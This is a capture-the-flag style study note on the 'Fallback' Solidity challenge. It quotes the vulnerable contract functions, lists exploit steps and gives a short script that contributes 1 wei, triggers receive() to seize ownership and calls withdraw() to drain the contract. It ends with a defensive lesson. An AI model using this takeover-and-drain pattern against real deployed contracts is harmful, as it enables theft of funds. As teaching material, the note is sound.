## 🧠 **Fallback Challenge - Quick Notes**

### 🎯 **Objectives**
- Become the **`owner`** of the `Fallback` contract.
- Withdraw all ETH, reducing the **contract balance to `0`**.

---

### 🧩 **Contract Logic Overview**

#### ✅ `contribute()`
```solidity
function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;

    if (contributions[msg.sender] > contributions[owner]) {
        owner = msg.sender;
    }
}
```
- Accepts **small contributions (< 0.001 ETH)**.
- Updates `contributions[msg.sender]`.
- Changes `owner` if sender’s total contribution exceeds current owner’s.

---

#### ✅ `receive()` (fallback function)
```solidity
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
}
```
- Triggered by a **plain ETH transfer** (via `.call{value: x}("")`)
- Requires:
  - A **non-zero** contribution from the sender
  - **Some ETH** in the call

---

#### ✅ `withdraw()`
```solidity
function withdraw() public onlyOwner {
    payable(owner).transfer(address(this).balance);
}
```
- Only the `owner` can withdraw entire contract balance.

---

### 🔓 **Exploit Steps**

1. **Contribute a small amount:**
   - e.g. `1 wei`
   - Satisfies `contributions[msg.sender] > 0`

2. **Send ETH directly to contract:**
   - Use `.call{value: 1 wei}("")`
   - Triggers `receive()` function and sets you as the `owner`

3. **Call `withdraw()`:**
   - Now you're the `owner`, you can drain the contract

---

### ✅ **Final Script Summary**
```solidity
_fallback.contribute{value: 1 wei}();
(bool success, ) = address(_fallback).call{value: 1 wei}("");
_fallback.withdraw();
```

---

### 🧰 **Helpful Tips**
- `receive()` is triggered when ETH is sent with **no calldata**.
- Use `.call{value: x}("")` to manually trigger it.
- `vm.startBroadcast()` and `vm.stopBroadcast()` are used in Foundry to broadcast transactions on forked or live networks.
- Don't exceed `0.001 ether` in `contribute()`, or it reverts.

---

### Takeaway
- Use of the receive & fallback functions
- Never implement critical logic in the fallback/receive function